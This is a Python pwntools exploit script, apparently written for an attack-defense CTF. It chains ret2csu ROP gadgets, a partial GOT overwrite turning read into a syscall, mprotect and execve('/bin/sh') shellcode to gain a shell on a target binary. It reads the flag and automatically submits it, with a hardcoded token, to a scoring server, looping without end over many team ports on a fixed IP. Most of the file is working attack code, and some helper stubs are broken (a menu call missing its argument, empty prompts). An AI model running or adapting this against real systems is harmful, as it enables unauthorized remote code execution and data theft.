#coding=utf-8
from pwn import *
import requests
import json
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)

a=""

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x0000000004005DC
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("",str(size))
    a.sendafter("",content)

def delete(idx):
    menu()
    a.sendlineafter("",str(idx))

def show(idx):
    menu()
    a.sendlineafter("",str(idx))

def subflag(flag):
    print flag
    headers = {'Content-Type': 'application/json'}
    url = "http://39.100.119.37:10000/commit/flag"
    data = {'flag':flag ,'token':'9c268520f2233715d96b5a2c9448787c'}
    r = requests.post(url,headers=headers,data = json.dumps(data))
    print(r.content)


def exp(ip,port):
    global a
    a=remote(ip,port)
    bss_addr =elf.bss()+0x100
    fuck(bss_addr)
    read_got=elf.got["read"]
    read_plt=elf.plt["read"]
    pop_rsp_pop3_ret=0x000000000040069d
    csu_foot = 0x00000000040069A
    csu_head = 0x000000000400680
    syscall = '\x7f'
    pop_rdi_ret=0x00000000004006a3
    payload='A'*40
    payload+=p64(csu_foot)
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(read_got)
    payload+=p64(0)
    payload+=p64(bss_addr)
    payload+=p64(0x200)
    payload+=p64(csu_head)
    payload+='A'*56
    payload+=p64(pop_rsp_pop3_ret)
    payload+=p64(bss_addr)
    payload=payload.ljust(0x100,'A')
    a.send(payload)
    
    pop_rsi_pop_ret = 0x00000000004006a1
    shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    payload=p64(0)*2
    payload+="/bin/sh\x00"#bss_addr+16
    payload+=p64(csu_foot)
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(read_got)
    payload+=p64(0)
    payload+=p64(read_got-10+1)
    payload+=p64(10)
    payload+=p64(csu_head)
    payload+='A'*56
    payload+=p64(csu_foot)
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(read_got)
    payload+=p64(bss_addr&0xfffffffffffff000)
    payload+=p64(0x2000)
    payload+=p64(7)
    payload+=p64(csu_head)
    payload+='A'*56
    payload+=p64(0x601250)
    payload+=shellcode_x64
    a.send(payload.ljust(0x200,'A'))
    a.send('A'*9+'\x7f')
    a.sendline("cat flag")
    flag = a.recvuntil("}").strip()
    subflag(flag)
    #a.interactive()



if __name__ == "__main__":
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
    ip="39.100.119.37"
    port = [ '40180', '40280', '40380', '40480', '40580', '40680', '40780', '40880', '40980', '41280', '41380', '41480', '41580', '41680', '41780', '41880', '41980', '42080', '42180', '42280', '42380', '42480', '42580', '42680', '42780', '42880', '42980', '43080']
    while 1:
        
        for i in port:
            try:
                exp(ip,i)
                a.close()
            except Exception as e:
                print e
                a.close()
                continue
        sleep(5)






